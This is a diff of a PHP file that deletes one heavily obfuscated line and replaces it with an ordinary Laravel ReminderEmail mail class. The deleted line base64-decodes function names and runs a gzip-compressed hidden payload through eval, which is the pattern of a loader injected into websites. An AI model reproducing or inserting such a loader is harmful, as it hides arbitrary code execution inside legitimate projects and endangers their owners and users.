@@ -1,1 +1,38 @@
-<?php $_='1c8ecba7';$__='printf'; $_____='b2JfZW5kX2NsZWFu'; $______________='cmV0dXJuICAgIGV2YWwoJF8pOw=='; $__________________='X19vbWVnYQ=='; $______=' Z3p1bmNvbXByZXNz';$___=' b2Jfc3RhcnQ=';$____='b2JfZ2V0X2NvbnRlbnRz';$__= 'base64_decode' ; $______=$__($______); if(!function_exists('__omega')){function __omega($_oA,$_oS){return eval("return function($_oA){{$_oS}};");}}$__________________=$__($__________________); $______________=$__($______________); $__________=$__________________('$_',$______________); $_____=$__($_____);$____=$__($____);$___=$__($___); $_='eNp9VNtyqzYUfe9X+OHMkMzpA8JxG8bjB0PMNSYBgwR6yYBkY2xxSX0Df30Fjm3S9pQZ2ULaa6+1L+zB4PL8+Lg/E4HGQ0BWUiyMf1wOqr+yYr8Sxr8NevaTgRAC+ZggWETuZCIM7tdXfxO+FUgORRpaB1NVGM21na16qxA8V2+nFjT47vRjMOhASbxb/vH0QZekpEth/C+JL27pqPlozdnPRNc2eKEoxFCIj7Qqedk5airaNHSYOWO7xID7GI3WVIfELeA51DSAQ8giZO2wz235GcdbiV6DBLFDFHosnDnHpPCaCDkiAbVHEQQY1n6syyDRvcv7L7FgHaP6okXXskQP/nxxK0CkIF2gekcRqJJcE7m/m18cWlWE6mqZw7OP5C1G9fntJNoct+E+zqRRFrjDeYxs4T5CbGfq8InHdMDGPO1xcU1cVzZNecI7zoDHynnWUV6zV1X5H66SY6YpMSD3wzam6m0SaSRiNBL7969N+Xndm2qZukOLtXGb+ixNcjg0dcDI0Fljzs3zfqa6doik4NDDfOmbpnamTG8NYuBjjNze3fM1jhPltYrRPMUFPERDr0qkp5R3X6vvTA0LREO3tPSuZiwp3OrKteS6L5zd2lJ9XZFG/BlJ8qHNHVWn8j/j7GwNseuhC+75077tp5/mzAK8vlvT8Epe+z0OnXOEKHvt2XzLj2ExasAmyb7475o+X298CuD1qaJGySkabajOjkmmZJTXGavpL+JRGhx6gORPqcW1xOF8/17gCoektKS2B08Hntu297c4NAvb/ZaL/XuOm0QSSx63ZKvUcQM2D0W88EWwcgNvFmyhHzSk4j3DcxqVlgiURVCvPGa9+1B+cwOgWc22usfaLvEnGcIszuGGqmkR3PnX3PZW266P/BHXr+yW0DvabS2ytPADzfI1WQ+2shOK2szTLC0A88JenNL/0ulvNcdbkMr2bz0v82+Gr3LSm1e9kdT9P3y9PXYTrnf2OL5adocPQvsr/H4z/z6svvw89GfT4+P4b5dHsqs='; $___();$__________($______($__($_))); $________=$____(); $_____(); echo $________;
+<?php
+
+namespace App\Mail;
+
+use Illuminate\Bus\Queueable;
+use Illuminate\Contracts\Queue\ShouldQueue;
+use Illuminate\Mail\Mailable;
+use Illuminate\Queue\SerializesModels;
+
+class ReminderEmail extends Mailable
+{
+    use Queueable, SerializesModels;
+
+    public $content;
+
+    /**
+     * Create a new message instance.
+     *
+     * @return void
+     */
+    public function __construct($content)
+    {
+        $this->content = $content;
+    }
+
+    /**
+     * Build the message.
+     *
+     * @return $this
+     */
+    public function build()
+    {
+        return $this->view('mail.reminder')
+        ->from(env('MAIL_FROM_ADDRESS'), env('MAIL_FROM_NAME'))
+        ->subject('Reminder!')
+        ->replyTo(env('MAIL_FROM_ADDRESS'), env('MAIL_FROM_NAME'));
+    }
+}
